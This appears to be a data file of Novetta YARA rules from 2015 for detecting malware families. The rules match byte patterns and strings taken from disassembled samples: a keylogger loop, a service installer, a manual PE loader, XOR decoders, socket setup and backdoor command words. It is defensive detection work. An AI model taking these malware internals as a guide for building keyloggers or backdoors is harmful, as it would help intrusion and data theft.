  "IndiaWhiskey": "rule IndiaWhiskey\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\t\t\n\t\tSource = \"0c729deec341267c5a9a2271f20266ac3b0775d70436c7770ddc20605088f3b4\"\n\t\tDescription = \"Winsec Installer\"\n\t\t\n\tstrings:\n\t/*\n\t\t// Service installation code\n\t\tFF 15 68 30 40 00  call    ds:wsprintfA\n\t\t83 C4 18           add     esp, 18h\n\t\t8D 85 FC FE FF FF  lea     eax, [ebp+var_104]\n\t\t56                 push    esi\n\t\t56                 push    esi\n\t\t56                 push    esi\n\t\t56                 push    esi\n\t\t56                 push    esi\n\t\t50                 push    eax\n\t\t6A 01              push    1\n\t\t// some variants have these two lines added\n\t\t5E                 pop     esi\n\t\t56                 push    esi\n\n\t\t6A 02              push    2\n\t\t68 20 01 00 00     push    120h\n\t\t68 FF 01 0F 00     push    0F01FFh\n\t\tFF 75 0C           push    [ebp+arg_4]\n\t\tFF 75 08           push    [ebp+arg_0]\n\t\t\n\t\t// some variants have the next line as a push {reg} or push {stack var}\n\t\t53                 push    ebx\n\t\t//or\n\t\tFF 75 FC           push    [ebp+var_4]\n\n\t\tFF 15 E4 49 40 00  call    CreateServiceA\n\t*/\n\n\t$a = {FF 15 [4] 83 C4 18 8D [5] 5? 5? 5? 5? 5? 5? 6A 01\t[0-2] 6A 02 68 20 01 00 00 68 FF 01 0F 00 FF 75 ?? FF 75 ?? (5? | FF 75 ??) FF 15}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "KiloAlfa": "rule KiloAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\ttype = \"Keylogger\"\n\t\tSourceForDnscalcVariant1 = \"b855d05ef7ab6582864c9b35052a1073a6eb7d0c7e9d97f524ec062715d71321\"\n\t\tSourceForDnscalcVariant2 = \"ddde628be8cd5db768b807510ae1319888e6c4550a5b9a0d54e17b9ec4aaa256\"\n\t\t\n\tstrings:\n\t\t/*\n\t\tpush    <variable>\n\t\tcall    GetAsyncKeyState\n\t\tcmp     ax, 8001h\n\t\tjnz     short loc_4021EE\n\t\tpush    <variable>             ; a1\n\t\tcall    AddCharacterToKeyLogBuffer\n\t\tadd     esp, 4\n\t\t\n\t\tthis block of code is used multiple times in sequence so i'm looking for 5 consecutive blocks\n\t\t*/\n\t\t$keyxlate = {68 ?? 00 00 00 FF 15 [4] 66 ?? 01 80 75 ?? 6A ?? E8 [4] 83 C4 04 68 ?? 00 00 00 FF 15 [4] 66 ?? 01 80 75 ?? 6A ?? E8 [4] 83 C4 04 68 ?? 00 00 00 FF 15 [4] 66 ?? 01 80 75 ?? 6A ?? E8 [4] 83 C4 04 68 ?? 00 00 00 FF 15 [4] 66 ?? 01 80 75 ?? 6A ?? E8 [4] 83 C4 04}\n\t\t\n\t/*\n\t\t6A 2A                    push    2Ah\n\t\tC6 84 24 C4 00 00 00 D6  mov     [esp+70Ch+var_648], 0D6h\n\t\tC6 84 24 C5 00 00 00 E1  mov     [esp+70Ch+var_647], 0E1h\n\t\tC6 84 24 C6 00 00 00 BF  mov     [esp+70Ch+var_646], 0BFh\n\t\tC6 84 24 C7 00 00 00 C8  mov     [esp+70Ch+var_645], 0C8h\n\t\tC6 84 24 C8 00 00 00 C3  mov     [esp+70Ch+var_644], 0C3h\n\t\tC6 84 24 C9 00 00 00 BD  mov     [esp+70Ch+var_643], 0BDh\n\t\t88 9C 24 CA 00 00 00     mov     [esp+70Ch+var_642], bl\n\t\tFF 15 48 5B 40 00        call    GetAsyncKeyState\n\t\t66 3D 01 80              cmp     ax, 8001h\n\t\t75 20                    jnz     short loc_401696\n\t\t8D 94 24 00 01 00 00     lea     edx, [esp+708h+pszOutput]\n\t\t8D 84 24 C0 00 00 00     lea     eax, [esp+708h+var_648]\n\t\t52                       push    edx             ; pszOutput\n\t\t6A 07                    push    7               ; dwLength\n\t\t50                       push    eax             ; pszInput\n\t\tE8 A3 F9 FF FF           call    DNSCALCDecode\n\t\t50                       push    eax             ; a1\n\t\tE8 7D FB FF FF           call    AddEntryToKeylogDataBuffer\n\t\t83 C4 10                 add     esp, 10h\n\t*/\n\n\t$keyxlateDnscalc1 = {\t6A 2A C6 [6] D6 C6 [6] E1 C6 [6] BF C6 [6] C8 C6 [6] C3 C6 [6] BD\t88 [6] FF 15 [4] 66 3D 01 80 75 ?? \t8D [6] 8D [6] 5? 6A 07 5? E8 [4] 50 E8 [4] 83 C4 10 }\t\n\n\t/*\n\t\t6A 2A                          push    2Ah\n\t\tC7 85 74 FF FF FF D6 E1 BF C8  mov     dword ptr [ebp+var_8C], 0C8BFE1D6h\n\t\t66 C7 85 78 FF FF FF C3 BD     mov     [ebp+var_88], 0BDC3h\n\t\t88 9D 7A FF FF FF              mov     [ebp+var_86], bl\n\t\tFF 15 04 47 41 00              call    GetAsyncKeyState\n\t\tBA 01 80 FF FF                 mov     edx, 0FFFF8001h\n\t\t66 3B C2                       cmp     ax, dx\n\t\t75 1E                          jnz     short loc_4018B0\n\t\t8D 85 CC FE FF FF              lea     eax, [ebp+a3]\n\t\t50                             push    eax             ; a3\n\t\t8D 8D 74 FF FF FF              lea     ecx, [ebp+var_8C]\n\t\t6A 07                          push    7               ; dwLength\n\t\t51                             push    ecx             ; a1\n\t\tE8 89 F7 FF FF                 call    DNSCalcDecode\n\t\t50                             push    eax             ; a1\n\t\tE8 83 F9 FF FF                 call    RecordStringToLog\n\t\t83 C4 10                       add     esp, 10h\n\t*/\n\n\t$keyxlateDnscalc2 = { 6A 2A C7 [5] D6 E1 BF C8 \t66 [6] C3 BD 88 [5]\tFF 15 [4] BA 01 80 FF FF 66 3B C2 75 ?? 8D [5] 5? 8D [5] 6A 07 5? E8 [4] 50 E8 [4] 83 C4 10 }\n\t\n\tcondition: \n\t\t$keyxlate in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $keyxlateDnscalc1 in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $keyxlateDnscalc2 in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\n}",
  "LimaAlfa": "rule LimaAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"c9fbad7fc7ff7688776056be3a41714a1f91458a7b16c37c3c906d17daac2c8b\"\n\t\tStatus = \"Signature is too loose to be useful.\"\n\n\tstrings:\n\t/*\n\t\t33 C0              xor     eax, eax\n\t\t66 8B 02           mov     ax, [edx]\n\t\t8B E8              mov     ebp, eax\n\t\t81 E5 00 F0 FF FF  and     ebp, 0FFFFF000h\n\t\t81 FD 00 30 00 00  cmp     ebp, 3000h\n\t\t75 0D              jnz     short loc_4019FB\n\t\t8B 6C 24 18        mov     ebp, [esp+10h+arg_4]\n\t\t25 FF 0F 00 00     and     eax, 0FFFh\n\t\t03 C7              add     eax, edi\n\t\t01 28              add     [eax], ebp\n\t*/\n\n\t$a = {33 C0 66 [2] 8B ?? 81 ?? 00 F0 FF FF 81 ?? 00 30 00 00 75 ?? 8B [3] 25 FF 0F 00 00 03 C7 01}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "LimaBravo": "rule LimaBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"Mwsagent.dll\"\n\n\tstrings:\n\t/*\n\t\t83 C4 34        add     esp, 34h\n\t\t83 FD 0A        cmp     ebp, 0Ah\n\t\t5D              pop     ebp\n\t\t5B              pop     ebx\n\t\t7E 12           jle     short loc_1000106F\n\t\t57              push    edi             ; Src\n\t\tC6 07 4D        mov     byte ptr [edi], 4Dh\n\t\tC6 47 01 5A     mov     byte ptr [edi+1], 5Ah\n\t\tE8 97 01 00 00  call    ManualImageLoad\n\t*/\n\n\t$a = {83 ?? 34 83 ?? 0A [0-2] 7E ?? 5? C6 ?? 4D C6 [2] 5A E8}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "LimaCharlie": "rule LimaCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource_x86 = \"6ee6ae79ee1502a11ece81e971a54f189a271be9ec700101a2bd7a21198b94c7\"\n\t\tSource_x64 = \"90ace24eb132c776a6d5bb0451437db21e84601495a2165d75f520af637e71e8\"\n\n\tstrings:\n\t\t$misspelling = \"Defualt Sleep = %d\" wide\n\n\t/*\n\t\tFF 76 74           push    dword ptr [esi+74h]\n\t\t59                 pop     ecx\n\t\t50                 push    eax\n\t\t8F 86 48 01 00 00  pop     dword ptr [esi+148h]\n\t\t85 C0              test    eax, eax\n\t\t51                 push    ecx\n\t\t8F 86 44 01 00 00  pop     dword ptr [esi+144h]\n\t\t75 3D              jnz     short loc_100035F3\n\t\tF6 46 56 01        test    byte ptr [esi+56h], 1\n\t\t74 0A              jz      short loc_100035C6\n\t*/\n\n\t$x86 = {FF ?? 74 5? 5? 8F ?? 48 01 00 00 85 C0 5? 8F ?? 44 01 00 00 75 ?? F6 [2] 01 74}\n\n\t/*\n\t\t48 8B 4B 70           mov     rcx, [rbx+70h]\n\t\t48 89 8B 60 01 00 00  mov     [rbx+160h], rcx\n\t\t48 89 83 68 01 00 00  mov     [rbx+168h], rax\n\t\t48 85 C0              test    rax, rax\n\t\t75 35                 jnz     short loc_180002372\n\t\tF6 43 56 01           test    byte ptr [rbx+56h], 1\n\t\t74 07                 jz      short loc_18000234A\n\t*/\n\n\t$x64 = {48 [2] 70 48 [2] 60 01 00 00 48 [2] 68 01 00 00 48 85 C0 75 ?? F6 [2] 01 74}\n\t\t\n\tcondition:\n\t\t$x86 in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $x64 in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $misspelling\n\t\t\n}",
  "LimaDelta": "rule LimaDelta\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"81e6118a6d8bf8994ce93f940059217481bfd15f2757c48c589983a6af54cfcc\"\n\n\tstrings:\n\t/*\n\t\t8B 69 FC           mov     ebp, [ecx-4]\n\t\t83 C1 10           add     ecx, 10h\n\t\t81 F5 6D 3A 71 58  xor     ebp, 58713A6Dh\n\t\t89 2A              mov     [edx], ebp\n\t\t33 ED              xor     ebp, ebp\n\t\t66 8B 69 F0        mov     bp, [ecx-10h]\n\t\t89 6A 04           mov     [edx+4], ebp\n\t\t83 C2 08           add     edx, 8\n\t\t4F                 dec     edi\n\t\t75 E3              jnz     short loc_4026CE\n\t*/\n\n\t$fileDecoder = {8B ?? ?? 83 ?? 10 81 ?? 6D 3A 71 58 89 ?? 33 ?? 66 ?? ?? F0 89 ?? 04 83 ?? 08 4? 75}\n\t\t\n\t/*\n\t\t66 81 BC 24 A0 00 00 00 BB 01  cmp     [esp+98h+arg_4], 1BBh\n\t\t74 21                          jz      short loc_401BD7\n\t\tFF 15 58 30 40 00              call    ds:rand\n\t\t99                             cdq\n\t\tB9 32 00 00 00                 mov     ecx, 32h\n\t\tF7 F9                          idiv    ecx\n\t\t8B DA                          mov     ebx, edx\n\t\t8D 54 24 5E                    lea     edx, [esp+98h+var_3A]\n\t\t53                             push    ebx             ; dwSize\n\t\t52                             push    edx             ; pvBuffer\n\t\tE8 3F FB FF FF                 call    GenerateRandomBuffer\n\t\t83 C4 08                       add     esp, 8\n\t\t83 C3 46                       add     ebx, 46h\n\t*/\n\n\t$authenicateBufferGen = {BB 01 74 ?? FF 15 [4] 99 B? 32 00 00 00 F7 ?? 8B ?? 8D [3] 5? 5? E8 [4] 83 C4 08 83 ?? 46}\n\t\n\tcondition:\n\t\t$authenicateBufferGen in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $fileDecoder in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "PapaAlfa": "rule PapaAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"pmsconfig.msi\" wide\n\t\t$ = \"pmslog.msi\" wide\n\t\t$ = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d\"\n\t\t$ = \"CreatP2P Thread\" wide\n\t\t$ = \"GreatP2P Thread\" wide\n\tcondition:\n\t\t3 of them\n}",
  "RomeoAlfa": "rule RomeoAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"fba0b8bdc1be44d100ac31b864830fcc9d056f1f5ab5486384e09bd088256dd0.file2.bin\"\n\n\tstrings:\n\t/*\n\t\t68 C4 94 41 00     push    offset a0_0_0_0 ; \"0.0.0.0\"\n\t\t56                 push    esi             ; wchar_t *\n\t\tE8 1C B4 00 00     call    _wcscpy\n\t\t83 C6 28           add     esi, 28h\n\t\t83 C4 08           add     esp, 8\n\t\t81 FE E8 CD 41 00  cmp     esi, offset unk_41CDE8\n\t\t7C E7              jl      short loc_4039DA\n\t*/\n\n\t$zeroIPLoader = {68 [4] 56 E8 [4] 83 C6 28 83 C4 08 81 FE [4] 7C E?}\n\t\t\n\n\n\t\t// push    esi                              \n\t\t// mov     esi, [esp+4+a1]                  \n\t\t// test    esi, esi                         \n\t\t// jle     short loc_403FEB                 \n\t\t// push    edi                              \n\t\t// mov     edi, ds:Sleep                    \n\t\t// push    0EA60h          ; dwMilliseconds \n\t\t// call    edi ; Sleep                      \n\t\t// dec     esi                              \n\t\t// jnz     short loc_403FE0                 \n\t\t// pop     edi                              \n\t\t// pop     esi                              \n\t\t// retn                                     \n\t\t$sleeper  = {5? 8B [3] 85 ?? 7E ?? 5? 8B 3D [4]  68 [4] FF ??  4? 75 ??\t5? 5? C3 }\n\t\t\t\n\t\t$xercesc = \"xercesc\"\n\t\t\n\tcondition:\n\t\t($sleeper in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $zeroIPLoader in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size)))\n\t\tand not $xercesc\n}",
  "RomeoBravo": "rule RomeoBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"95314a7af76ec36cfba1a02b67c2b81526a04e3b2f9b8fb9b383ffcbcc5a3d9b\"\n\n\tstrings:\n\t/*\n\t\tE8 D9 FC FF FF  call    SendData\n\t\t83 C4 10        add     esp, 10h\n\t\t85 C0           test    eax, eax\n\t\t74 0A           jz      short loc_10003FE8\n\t\tB8 02 00 00 00  mov     eax, 2\n\t\t5E              pop     esi\n\t\t83 C4 18        add     esp, 18h\n\t\tC3              retn\n\t\t6A 78           push    78h             ; dwTimeout\n\t\t6A 01           push    1               ; fDecode\n\t\t8D 54 24 18     lea     edx, [esp+24h+recvData]\n\t\t6A 0C           push    0Ch             ; dwLength\n\t\t52              push    edx             ; pvBuffer\n\t\t56              push    esi             ; skt\n\t\tE8 57 FD FF FF  call    RecvData\n\t\t83 C4 14        add     esp, 14h\n\t\t85 C0           test    eax, eax\n\t\t74 0A           jz      short loc_1000400A\n\t\tB8 02 00 00 00  mov     eax, 2\n\t*/\n\n\t$a = {E8 [4] 83 C4 10 85 C0 74 ?? B? 02 00 00 00 5? 83 C4 18 C3 6A 78 6A 01 8D [3] 6A 0C 5? 5? E8 [4] 83 C4 14 85 C0 74 ?? B8 02 00 00 00}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoCharlie": "rule RomeoCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"a82108ef7115931b3fbe1fab99448c4139e22feda27c1b1d29325710671154e8\"\n\n\tstrings:\n\t\t$auth1 = \"Success - Accept Auth\"\n\t\t$auth2 = \"Fail - Accept Auth\"\n\n\t/*\n\t\t81 E3 FF FF 00 00  and     ebx, 0FFFFh\n\t\t8B EB              mov     ebp, ebx\n\t\t57                 push    edi\n\t\tC1 EE 10           shr     esi, 10h\n\t\t81 E5 FF FF 00 00  and     ebp, 0FFFFh\n\t\t8B FE              mov     edi, esi\n\t\t8B C5              mov     eax, ebp\n\t\t81 E7 FF FF 00 00  and     edi, 0FFFFh\n\t\tC1 E0 10           shl     eax, 10h\n\t\t6A 00              push    0               ; _DWORD\n\t\t0B C7              or      eax, edi\n\t\t6A 00              push    0               ; _DWORD\n\t\t50                 push    eax             ; _DWORD\n\t\t68 10 14 11 71     push    offset sub_71111410; _DWORD\n\t\t6A 00              push    0               ; _DWORD\n\t\t6A 00              push    0               ; _DWORD\n\t\tFF 15 5C 8E 12 71  call    CreateThread_0\n\t\tC1 E7 10           shl     edi, 10h\n\t*/\n\n\t$startupRelayThreads = {81 ?? FF FF 00 00 8B ?? 5? C1 ?? 10 81 ?? FF FF 00 00 8B ?? 8B ?? 81 ?? FF FF 00 00 C1 ?? 10 6A 00 0B ?? 6A 00 \t50 68 [4] 6A 00 6A 00 FF 15 [4] C1 ?? 10 }\n\n\t/*\n\tsource: 641808833ad34f2e5143001c8147d779dbfd2a80a80ce0cfc81474d422882adb\n\t\t25 00 20 00 00     and     eax, 2000h\n\t\t3D 00 20 00 00     cmp     eax, 2000h\n\t\t0F 94 C1           setz    cl\n\t\t81 E2 80 00 00 00  and     edx, 80h\n\t\t33 C0              xor     eax, eax\n\t\t80 FA 80           cmp     dl, 80h\n\t\t0F 94 C0           setz    al\n\t\t03 C8              add     ecx, eax\n\t\t33 D2              xor     edx, edx\n\t\t83 F9 01           cmp     ecx, 1\n\t*/\n\n\t$crypto = {2? 00 20 00 00 3? 00 20 00 00 0F [2] 81 ?? 80 00 00 00 33 ?? 80 ?? 80 0F [2] 03 ?? 33 ?? 83 ?? 01 }\n\n\tcondition:\n\t\tall of ($auth*) \n\t\tor $startupRelayThreads in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor $crypto in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoDelta": "rule RomeoDelta\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"1df2af99fb3b6e31067b06df07b96d0ed0632f85111541a416da9ceda709237c\"\n\n\tstrings:\n\t/*\n\t\tE8 78 00 00 00  call    GenerateRandomBuffer\n\t\t33 C0           xor     eax, eax\n\t\t8A 4C 04 04     mov     cl, [esp+eax+24h+buffer]\n\t\t80 E9 22        sub     cl, 22h\n\t\t80 F1 AD        xor     cl, 0ADh\n\t\t88 4C 04 04     mov     [esp+eax+24h+buffer], cl\n\t\t40              inc     eax\n\t\t83 F8 10        cmp     eax, 10h\n\t\t7C EC           jl      short loc_1000117A\n\t\t6A 01           push    1               ; fEncode\n\t\t8D 54 24 08     lea     edx, [esp+28h+buffer]\n\t\t6A 10           push    10h             ; dwDataLength\n\t\t52              push    edx             ; pvData\n\t\t8B CB           mov     ecx, ebx        ; this\n\t\tE8 A2 00 00 00  call    CSocket__Send\n\t*/\n\n\t$loginInit = { E8 [4] 33 C0 8A [3] 80 [2] 80 [2] 88 [3] 40 83 F8 10 7C ?? 6A 01 8D [3] 6A 10 5? 8B CB E8\t}\n\n\tcondition:\n\t\t$loginInit in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoEcho": "rule RomeoEcho\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"%s %-20s %10lu %s\"\n\t\t$ = \"_quit\"\n\t\t$ = \"_exe\"\n\t\t$ = \"_put\"\n\t\t$ = \"_get\"\n\n\tcondition:\n\t\tall of them\n}",
  "RomeoFoxtrot": "rule RomeoFoxtrot\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"dropped.bin\"\n\t\tSource_relativeCalls = \"635bebe95671336865f8a546f06bf67ab836ea35795581d8a473ef2cd5ff4a7f\"\n\n\tstrings:\n\t/*\n\t\tC7 44 24 08 01 00 00 00  mov     [esp+128h+argp], 1\n\t\t8B 8C 24 30 01 00 00     mov     ecx, dword ptr [esp+128h+wPort]\n\t\tC7 44 24 04 00 00 20 03  mov     dword ptr [esp+128h+optval], 3200000h\n\t\t51                       push    ecx             ; hostshort\n\t\t89 44 24 1C              mov     dword ptr [esp+12Ch+name.sin_addr.S_un], eax\n\t\tFF 15 8C 01 FF 7E        call    ds:htons\n\t\t6A 06                    push    6               ; protocol\n\t\t6A 01                    push    1               ; type\n\t\t6A 02                    push    2               ; af\n\t\t66 89 44 24 22           mov     [esp+134h+name.sin_port], ax\n\t\t66 C7 44 24 20 02 00     mov     [esp+134h+name.sin_family], 2\n\t\tFF 15 84 01 FF 7E        call    ds:socket\t\t\t\t\t\t\t\t     <--- this could be a relative call in some variants\n\t\t83 F8 FF                 cmp     eax, 0FFFFFFFFh\n\t\t89 46 04                 mov     [esi+4], eax\n\t\t0F 84 AD 00 00 00        jz      loc_7EFE4C63\n\t\t57                       push    edi\n\t\t8B 3D 88 01 FF 7E        mov     edi, ds:setsockopt            <---- this line is missing when relative calls are used\n\t\t8D 54 24 08              lea     edx, [esp+12Ch+optval]\n\t\t6A 04                    push    4               ; optlen\n\t\t52                       push    edx             ; optval\n\t\t68 02 10 00 00           push    1002h           ; optname\n\t\t68 FF FF 00 00           push    0FFFFh          ; level\n\t\t50                       push    eax             ; s\n\t\tFF D7                    call    edi ; setsockopt\t\t\t\t\t\t\t\t<--- this could be a relative call in some variants\n\t\t8B 4E 04                 mov     ecx, [esi+4]\n\t\t8D 44 24 08              lea     eax, [esp+12Ch+optval]\n\t\t6A 04                    push    4               ; optlen\n\t\t50                       push    eax             ; optval\n\t\t68 01 10 00 00           push    1001h           ; optname\n\t\t68 FF FF 00 00           push    0FFFFh          ; level\n\t\t51                       push    ecx             ; s\n\t\tFF D7                    call    edi ; setsockopt\t\t\t\t\t\t\t\t<--- this could be a relative call in some variants\n\t*/\n\n\t\t$connect = { C7 [3] 01 00 00 00 8B [6] C7 [3] 00 00 20 03 5? 89 [3] ( FF 15 | E8 ) [4] 6A 06 6A 01 6A 02 66 [4] 66 [4] 02 00 ( FF 15 | E8 ) [4] 83 F8 FF 89 [2] 0F 84 [4] [0-7] 8D [3] 6A 04 5? 68 02 10 00 00 68 FF FF 00 00 5? ( FF D? | E8 [3] ??) 8B [2] 8D [3] 6A 04 5? 68 01 10 00 00 68 FF FF 00 00 5? ( FF D? | E8 [3] ??) }\n\t\t$response = \"RESPONSE 200 OK!!!\"\n\n\tcondition:\n\t\t$response or \n\t\t$connect in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoGolf": "rule RomeoGolf\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"7322d6b9328a9c708518c99b03a4ed3aa6ba943d7b439f6b1925e6d52a1828fe\"\n\n\tstrings:\n\t/*\n\t\tFF 15 70 80 01 10  call    ds:GetTickCount\n\t\t50                 push    eax             ; unsigned int\n\t\tE8 80 93 00 00     call    _srand\n\t\t83 C4 04           add     esp, 4\n\t\tE8 85 93 00 00     call    _rand\n\t\tC1 E0 10           shl     eax, 10h\n\t\t89 46 0C           mov     [esi+0Ch], eax\n\t\tE8 7A 93 00 00     call    _rand\n\t\t01 46 0C           add     [esi+0Ch], eax\n\t\tE8 72 93 00 00     call    _rand\n\t\tC1 E0 10           shl     eax, 10h\n\t\t89 46 08           mov     [esi+8], eax\n\t\tE8 67 93 00 00     call    _rand\n\t\t01 46 08           add     [esi+8], eax\n\t*/\n\n\t$idGen = {FF 15 [4] 50 E8 [4] 83 C4 04 E8 [4] C1 ?? 10 89 [2] E8 [4] 01 [2] E8 [4] C1 ?? 10 89 [2] E8 [4] ?? ?? ?? }\n\tcondition:\n\t\t$idGen in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "RomeoHotel": "rule RomeoHotel\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource_64 = \"440cb3f6dd07e2f9e3d3614fd23d3863ecfc08b463b0b327eedf08504f838c90\"\n\t\tSource_diskSpace = \"1b1496f8f35d32a93c7f16ebff6e9b560a158cc6fce061491f91bc9f43ef5be4\"\n\n\tstrings:\n\t/*\n\t\tE8 D3 C7 00 00  call    rand\n\t\t44 8B ED        mov     r13d, ebp\n\t\t44 8B E0        mov     r12d, eax\n\t\tB8 1F 85 EB 51  mov     eax, 51EB851Fh\n\t\t48 8B FD        mov     rdi, rbp\n\t\t41 F7 EC        imul    r12d\n\t\tC1 FA 05        sar     edx, 5\n\t\t8B CA           mov     ecx, edx\n\t\tC1 E9 1F        shr     ecx, 1Fh\n\t\t03 D1           add     edx, ecx\n\t\t6B D2 64        imul    edx, 64h\n\t\t44 2B E2        sub     r12d, edx\n\t\t41 83 C4 3C     add     r12d, 3Ch\n\t*/\n\n\t$randBuff64 = {E8 [4] 44 [2] 44 [2] B? 1F 85 EB 51 48 [2] 41 [2] C1 ?? 05 8B ?? C1 ?? 1F 03 ??\t6B ?? 64 44 [2]\t41 [2] 3C}\n\t\t\n\t/*\n\t\tFF 15 40 70 01 10     call    ds:GetDiskFreeSpaceExA\n\t\t85 C0                 test    eax, eax\n\t\t74 34                 jz      short loc_10005072\n\t\t8B 84 24 20 01 00 00  mov     eax, [esp+11Ch+arg_0]\n\t\t6A 00                 push    0\n\t\t99                    cdq\n\t\t68 00 00 10 00        push    100000h\n\t\t52                    push    edx\n\t\t50                    push    eax\n\t\tE8 4C 7C 00 00        call    __allmul\n\t*/\n\n\t$diskSpace = {FF 15 [4] 85 C0 74 ?? 8B [6] 6A 00 99 68 00 00 10 00 5? 5? E8}\n\t\t\n\t$winst = \"winsta0\\\\default\" wide\t\t// this limits the overlap with RomeoGolf\n\n\tcondition:\n\t\t$randBuff64 in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tor ($diskSpace in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\t\tand $winst)\n}",
